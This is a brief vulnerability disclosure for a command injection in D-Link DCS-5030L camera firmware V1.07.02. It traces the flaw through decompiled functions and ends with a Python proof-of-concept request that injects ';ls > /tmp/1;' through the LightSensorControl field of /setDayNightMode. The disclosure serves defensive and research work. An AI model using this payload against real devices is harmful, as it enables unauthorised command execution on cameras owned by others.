# command injection

## D-LINK DCS-5030L

version: V1.07.02

## Description:

There is a command injection in alphapd/sub_437314

## Source:

you may download it from : [legacyfiles.us.dlink.com - /DCS-5030L/REVA/FIRMWARE/](http://legacyfiles.us.dlink.com/DCS-5030L/REVA/FIRMWARE/)

## Analyse:

![](7.png)

If some keywords are null and set ConfigReboot, we can get into line 37.

![](8.png)

![](9.png)

in sub_4368B4, DayNightMode's default value which get from nvram is zero,and we set DayNightMode to 1 ,eventually will return 1.

![](10.png)

finally, causes command injection via parameter v10.

## POC

```
url = "http://192.168.1.13/setDayNightMode"
headers = {
    'Host': '192.168.1.13',
    'Authorization': 'Basic base64(admin:password)',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
}
data = {
    'ReplySuccessPage':'advanced.htm',
    'ReplyErrorPage':'errradv.htm',
    'LightSensorControl':';ls > /tmp/1;',
    'DayNightMode':'1',
    'ConfigReboot':'No'
}
r = requests.post(url, data=data,headers=headers)
```
